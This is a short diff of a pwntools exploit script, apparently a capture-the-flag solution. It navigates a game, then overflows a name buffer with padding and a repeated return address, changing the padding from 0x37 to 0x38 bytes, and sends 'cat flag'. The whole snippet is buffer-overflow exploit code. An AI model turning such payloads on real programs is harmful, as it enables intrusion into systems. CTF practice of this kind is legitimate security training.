@@ -23,9 +23,9 @@ def main():
     p.send('OPENSESAMIO')
     p.send('sssdddddddddddd')
     p.send('aaaaaaaaaaaawww')
-    p.send('ddddddd')
+    p.send('dddddd')
     p.recvuntil('record your name : ')
-    p.sendline('A' * 0x37 + 2 * p64(0X00000000004017b4))
+    p.sendline('A' * 0x38 + 2 * p64(0X00000000004017b4))
     p.sendline('cat flag')
 
     p.interactive()
